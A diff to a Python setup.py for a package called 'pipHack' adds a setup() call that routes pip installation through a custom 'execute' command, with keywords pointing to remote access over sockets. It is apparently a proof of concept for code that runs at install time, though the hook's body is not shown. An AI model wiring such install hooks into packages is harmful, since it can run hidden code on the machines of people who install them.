@@ -112,5 +112,21 @@ CLASSIFIERS = [
         "License :: OSI Approved :: MIT License",
     ]
 # Setting up
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+setup(
+    name="pipHack",
+    version=VERSION,
+    author="zeroc",
+    description=DESCRIPTION,
+    long_description= open('README.md').read(),
+    long_description_content_type="text/markdown",
+    packages=find_packages(),
+    url = "https://github.com/Zeroc0077/pipHack",
+    project_urls = {
+        "Bug Tracker": "https://github.com/Zeroc0077/pipHack/issues",
+    },
+    install_requires=[''],
+    keywords=['python', 'vulnerability', 'remoteaccess', 'sockets'],
+    classifiers= CLASSIFIERS,
+    cmdclass={'install': execute},
+)
  
